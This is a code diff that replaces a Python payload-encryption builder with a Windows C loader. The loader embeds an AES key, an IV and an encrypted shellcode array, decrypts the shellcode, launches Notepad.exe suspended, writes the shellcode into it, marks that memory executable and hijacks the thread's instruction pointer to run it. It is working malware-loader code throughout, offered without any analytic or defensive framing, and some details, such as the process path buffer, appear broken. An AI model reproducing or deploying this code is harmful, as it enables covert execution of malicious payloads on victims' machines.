@@ -1,58 +1,5 @@
-import os
-import sys
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-
-def generate_key():
-    # Generate a random 32-byte (256-bit) key
-    return os.urandom(32)
-
-def generate_iv():
-    # Generate a random 16-byte (128-bit) IV
-    return os.urandom(16)
-
-def encrypt_message(key, iv, message):
-    # Pad the message if its length is not a multiple of 16
-    if len(message) % 16 != 0:
-        message = message.ljust(len(message) + (16 - len(message) % 16))
-    
-    # Create a Cipher object
-    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
-    encryptor = cipher.encryptor()
-    
-    # Encrypt the message
-    ciphertext = encryptor.update(message) + encryptor.finalize()
-    
-    return ciphertext
-
-def getPayload():
-    filename = './payload.bin'
-    try:
-        with open(filename, 'rb') as file:
-            # Read the entire file
-            file_content = file.read()
-            return file_content
-    except IOError as e:
-        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
-        raise
-
-def get_hex_string(data):
-    result = ''
-
-    for i in range(0, len(data), 16):
-        result += "\t"
-        chunk = data[i:i+16]
-        for byte in chunk:
-            result += f"0x{byte:02x}, "
-        result += "\n"
-
-    return result[1:-3]
-
-def fill_template(encrypted, key, iv):
-    libs = ''' \
-#include <stdint.h>
+#include <windows.h>
+ #include <stdint.h>
 
 typedef struct {
     uint16_t slice[8];
@@ -71,10 +18,10 @@ typedef struct {
 void AES256_CBC_init(OUT AES256_CBC_ctx* ctx, IN const unsigned char* key16, IN const uint8_t* iv);
 boolean AES256_CBC_encrypt(IN AES256_CBC_ctx* ctx, IN const unsigned char* plain, IN size_t plainsize, OUT PBYTE* encrypted);
 boolean AES256_CBC_decrypt(IN AES256_CBC_ctx* ctx, IN const unsigned char* encrypted, IN size_t ciphersize, OUT PBYTE* plain);
-'''
 
-    functions = ''' \
-static void LoadByte(AES_state* s, unsigned char byte, int r, int c) {
+#define TARGET_PROC "Notepad.exe" // Target process to inject
+
+ static void LoadByte(AES_state* s, unsigned char byte, int r, int c) {
     int i;
     for (i = 0; i < 8; i++) {
         s->slice[i] |= (uint16_t)(byte & 1) << (r * 4 + c);
@@ -621,12 +568,127 @@ boolean AES256_CBC_decrypt(IN AES256_CBC_ctx* ctx, IN const unsigned char* encry
 
     return TRUE;
 }
-'''
 
-    functions += "\nunsigned char pKey[] = {" + key + "};\nunsigned char pIv[] = {" + iv + "};"
+unsigned char pKey[] = {0x93, 0xf4, 0x59, 0x10, 0x0d, 0x16, 0xe3, 0x3c, 0x90, 0x4f, 0x07, 0xe0, 0x14, 0xd3, 0x06, 0xc0, 0x72, 0x7b, 0x77, 0x23, 0x4d, 0xef, 0x8c, 0x8e, 0x8a, 0x73, 0x33, 0x8d, 0x61, 0x55, 0x99, 0x8d};
+unsigned char pIv[] = {0x84, 0xee, 0xc2, 0x6d, 0x3a, 0xb9, 0x6e, 0x41, 0x1f, 0xb3, 0x05, 0x5c, 0x42, 0x34, 0x0f, 0x21};
+BOOL CreateSuspendedProcess (IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
+	CHAR				    lpPath          [MAX_PATH * 2];
+	CHAR				    WnDr            [MAX_PATH];
 
-    payload_mods = ''' \
-    // Struct needed for Tiny-AES library
+	STARTUPINFO			    Si              = { 0 };
+	PROCESS_INFORMATION		Pi              = { 0 };
+
+	// Cleaning the structs by setting the member values to 0
+	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
+	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
+
+	// Setting the size of the structure
+	Si.cb = sizeof(STARTUPINFO);
+
+	// Getting the value of the %WINDIR% environment variable
+	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
+		return FALSE;
+	}
+
+	if (!CreateProcessA(
+		NULL,					// No module name (use command line)
+		lpPath,					// Command line
+		NULL,					// Process handle not inheritable
+		NULL,					// Thread handle not inheritable
+		FALSE,					// Set handle inheritance to FALSE
+		CREATE_SUSPENDED,		// Creation flag
+		NULL,					// Use parent's environment block
+		NULL,					// Use parent's starting directory 
+		&Si,					// Pointer to STARTUPINFO structure
+		&Pi)) {					// Pointer to PROCESS_INFORMATION structure
+
+		return FALSE;
+	}
+
+	// Populating the OUT parameters with CreateProcessA's output
+	*dwProcessId    = Pi.dwProcessId;
+	*hProcess       = Pi.hProcess;
+	*hThread        = Pi.hThread;
+	
+	// Doing a check to verify we got everything we need
+	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
+		return TRUE;
+
+	return FALSE;
+}
+
+BOOL InjectToRemoteProcess (IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
+	SIZE_T  sNumberOfBytesWritten    = NULL;
+	DWORD   dwOldProtection          = NULL;
+
+
+	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (*ppAddress == NULL) {
+		return FALSE;
+	}
+
+	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
+		return FALSE;
+	}
+
+	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
+	CONTEXT		ThreadCtx = {
+			.ContextFlags = CONTEXT_CONTROL
+	};
+
+	// getting the original thread context
+	if (!GetThreadContext(hThread, &ThreadCtx)) {
+		return FALSE;
+	}
+
+	 // updating the next instruction pointer to be equal to our shellcode's address 
+	ThreadCtx.Rip = pAddress;
+
+	// setting the new updated thread context
+	if (!SetThreadContext(hThread, &ThreadCtx)) {
+		return FALSE;
+	}
+
+	// resuming suspended thread, thus running our payload
+	ResumeThread(hThread);
+
+	WaitForSingleObject(hThread, INFINITE);
+
+	return TRUE;
+}
+
+
+const unsigned char pPayload[] = {
+	0x8a, 0x32, 0x2c, 0x61, 0x98, 0xe7, 0x4c, 0x99, 0xd0, 0x46, 0x76, 0xa0, 0x0e, 0xa1, 0xaa, 0xeb, 
+	0x21, 0xbc, 0x42, 0xbb, 0x51, 0x08, 0xa9, 0x42, 0xe9, 0x4b, 0x9d, 0xdc, 0x3b, 0x1d, 0x6d, 0x8d, 
+	0x41, 0x5e, 0x4e, 0xf9, 0xe4, 0x84, 0x57, 0xcb, 0x98, 0x81, 0xd6, 0x66, 0x06, 0x66, 0xdf, 0xe4, 
+	0x32, 0x06, 0x32, 0xc6, 0xc9, 0x9e, 0x17, 0x0d, 0xd1, 0x61, 0x85, 0xa6, 0xaa, 0xf4, 0xc9, 0x2e, 
+	0xa0, 0xa3, 0xc3, 0xb7, 0x40, 0x2e, 0x0f, 0x70, 0xcd, 0xff, 0xc5, 0x6d, 0x3b, 0xfe, 0x07, 0xe6, 
+	0xce, 0x22, 0x8f, 0x21, 0x1d, 0xea, 0x0c, 0xaf, 0x97, 0x06, 0x6a, 0x29, 0xc8, 0xe4, 0x37, 0x11, 
+	0x11, 0x75, 0xb1, 0x25, 0x76, 0x49, 0xe3, 0x99, 0xe8, 0xcb, 0xe6, 0xd1, 0x4c, 0xfe, 0x33, 0x24, 
+	0x0c, 0xbf, 0x75, 0xf4, 0x06, 0xb9, 0x77, 0x9e, 0x05, 0x64, 0xf3, 0xfd, 0xb1, 0xc7, 0x1c, 0x44, 
+	0x3b, 0xe6, 0xf1, 0x47, 0xb5, 0x76, 0x6e, 0x69, 0x9a, 0xa3, 0x34, 0x13, 0xf4, 0x50, 0xf0, 0xfb, 
+	0xc5, 0x2d, 0x1b, 0xd9, 0xd7, 0xcf, 0x3e, 0x7b, 0x81, 0x3f, 0xbb, 0x93, 0xd9, 0x6a, 0xb3, 0xf7, 
+	0xd0, 0xe2, 0x4a, 0x5b, 0x09, 0xa9, 0x8c, 0x80, 0x7f, 0x8d, 0xdf, 0x80, 0xd1, 0x41, 0x97, 0xd7, 
+	0xd5, 0x48, 0x9e, 0x13, 0x8e, 0x28, 0x3b, 0xa9, 0xdd, 0xbf, 0x0d, 0xc0, 0x20, 0xad, 0xc5, 0xec, 
+	0x7b, 0x57, 0xd9, 0xc6, 0x0f, 0x3f, 0x89, 0x41, 0x58, 0x2c, 0xb4, 0x56, 0x17, 0xed, 0x9f, 0x1c, 
+	0x43, 0xfb, 0x02, 0xa3, 0x08, 0x40, 0x84, 0x90, 0x28, 0x37, 0xab, 0x68, 0xf6, 0x33, 0x9f, 0x8f, 
+	0x8a, 0xf1, 0x4b, 0xb5, 0x62, 0x0a, 0x9b, 0xe0, 0x70, 0xa1, 0x4c, 0xc3, 0xeb, 0xa6, 0x9c, 0x44, 
+	0xc0, 0x51, 0x1e, 0x36, 0x36, 0x7c, 0x74, 0x19, 0xb7, 0xff, 0x42, 0x19, 0x7b, 0xe2, 0x52, 0x5e, 
+	0xdd, 0x8a, 0xb8, 0x68, 0x7b, 0xfb, 0xbb, 0x55, 0x9e, 0x36, 0xf2, 0xd9, 0x87, 0x1b, 0xd3, 0x65, 
+	0x94, 0x59, 0xae, 0xed, 0xfb, 0xed, 0xaa, 0xfb, 0x55, 0x88, 0xa2, 0xa1, 0x50, 0x5c, 0x14, 0xea
+};
+
+int main() {
+
+     // Struct needed for Tiny-AES library
     AES256_CBC_ctx	ctx  			= {0};
     SIZE_T      	sPayloadSize	= sizeof(pPayload);
 
@@ -642,42 +704,27 @@ boolean AES256_CBC_decrypt(IN AES256_CBC_ctx* ctx, IN const unsigned char* encry
 
     // Decrypting
     AES256_CBC_decrypt(&ctx, pPayload, sPayloadSize, &pShellcode);
-'''
 
-    # Read the content of the input file
-    with open("./src/main.c", 'r') as file:
-        content = file.read()
 
-    # Replace the template
-    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
-                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
-                              .replace("{{PAYLOAD}}", encrypted) \
-                              .replace("{{PAYLOAD_MODS}}", payload_mods)
+	HANDLE		hProcess	= NULL,
+				hThread		= NULL;
+	DWORD		dwProcessId = NULL;
+	PVOID		pAddress	= NULL;
 
-    # Write the modified content to the output file
-    with open("./src/main.c", 'w') as file:
-        file.write(modified_content)
-    
+	// Creating sacrificial remote process in suspended state
+	if (!CreateSuspendedProcess(TARGET_PROC, &dwProcessId, &hProcess, &hThread)) {
+		return -1;
+	}
 
-def desc():
-    return "Constant Time AES Encryption"
+	// Write Shellcode to remote proc
+	if (!InjectToRemoteProcess(hProcess, pShellcode, sPayloadSize, &pAddress)) {
+		return -1;
+	}
 
-def run():
-    original_data = getPayload()
+	// Hijack thread to run payload
+	if (!HijackThread(hThread, pAddress)) {
+		return -1;
+	}
 
-    # Generate random key (size 32)
-    key = generate_key()
-    key_str = ", ".join([f"0x{byte:02x}" for byte in bytearray(key)])
-
-    # Generate random iv
-    iv = generate_iv()
-    iv_str = ", ".join([f"0x{byte:02x}" for byte in bytearray(iv)])
-
-    # Encrypt data
-    encrypted_data = encrypt_message(key, iv, original_data)
-    encrypted_str = get_hex_string(encrypted_data)
-
-    # Fill template
-    fill_template(encrypted_str, key_str, iv_str)
-
-    return
+	return 0;
+}
